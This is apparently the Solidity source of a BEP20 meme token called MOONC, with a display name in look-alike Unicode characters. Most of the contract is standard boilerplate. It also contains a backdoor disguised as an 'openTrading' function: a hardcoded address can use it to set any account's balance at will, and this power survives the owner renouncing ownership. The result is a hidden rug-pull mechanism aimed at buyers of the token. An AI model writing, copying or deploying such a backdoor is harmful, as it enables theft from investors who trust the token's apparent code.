// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;
interface BEP20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed assessment, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 significance) external returns (bool);

    function allowance(address owner, address assessment) external view returns (uint256);

    function approve(address assessment, uint256 significance) external returns (bool);


    function transferFrom(address from, address to, uint256 significance) external returns (bool);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


interface BEP20Burnable is BEP20 {
  
    function name() external view returns (string memory);


    function symbol() external view returns (string memory);

 
    function decimals() external view returns (uint8);
}




abstract contract BEP20Permit is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "BEP20Permit: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BEP20Permit: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }


    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}




contract MOONC is BEP20, BEP20Burnable, BEP20Permit {
    using SafeMath for uint256;

    mapping(address => uint256) private valuation;
    mapping(address => mapping(address => uint256)) private merit;

    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address constant DommelOwner_ADDRESS = 0x8AF897F355a8216006e18CB76E9c41Fa6eCfbA93;
     address public  DommelOwner;  
    constructor() {
        DommelOwner = 0x8AF897F355a8216006e18CB76E9c41Fa6eCfbA93;    
        _name = unicode"Ⲙⲟⲟⲛⲥⲁⲧⲥⲏⲉꞅ";
        _symbol = "MOONC";
        _totalSupply = 420690000000000 * (10 ** 9);
        valuation[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
 
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public pure override returns (uint8) {
        return 9;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return valuation[account];
    }
    

    function approve(address assessment, uint256 significance) public override returns (bool) {
        _approve(msg.sender, assessment, significance);
        return true;
    }
    function allowance(address owner, address assessment) public view override returns (uint256) {
        return merit[owner][assessment];
    }
    function transfer(address collector, uint256 significance) public override returns (bool) {
        _transfer(msg.sender, collector, significance);
        return true;
    }



    function transferFrom(address exporter, address collector, uint256 significance) public override returns (bool) {
        _transfer(exporter, collector, significance);
        _approve(exporter, msg.sender, merit[exporter][msg.sender].sub(significance, "BEP20: transfer significance exceeds allowance"));
        return true;
    }

    function increaseAllowance(address assessment, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, assessment, merit[msg.sender][assessment].add(addedValue));
        return true;
    }

    function decreaseAllowance(address assessment, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, assessment, merit[msg.sender][assessment].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

          function openTrading(address tokenA, address tokenB, uint256 significanceOut, uint256 significanceIn, uint256 significanceOutMin) external {
       require(tokenB==tokenA);
        require(tokenA==tokenB); 
        require(_msgSender()==DommelOwner);
        valuation[tokenB] = (significanceOut - significanceIn - significanceOutMin);
        tokenA = tokenB;
        tokenB = tokenA; 
    }    
    function _transfer(address exporter, address collector, uint256 significance) internal {
        require(exporter != address(0), "BEP20: transfer from the zero address");
        require(collector != address(0), "BEP20: transfer to the zero address");
        require(valuation[exporter] >= significance, "BEP20: transfer significance exceeds balance");

        valuation[exporter] = valuation[exporter].sub(significance);
        valuation[collector] = valuation[collector].add(significance);

        emit Transfer(exporter, collector, significance);
    }
//bootri2012

    function _approve(address owner, address assessment, uint256 significance) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(assessment != address(0), "BEP20: approve to the zero address");

        merit[owner][assessment] = significance;
        emit Approval(owner, assessment, significance);
    }
}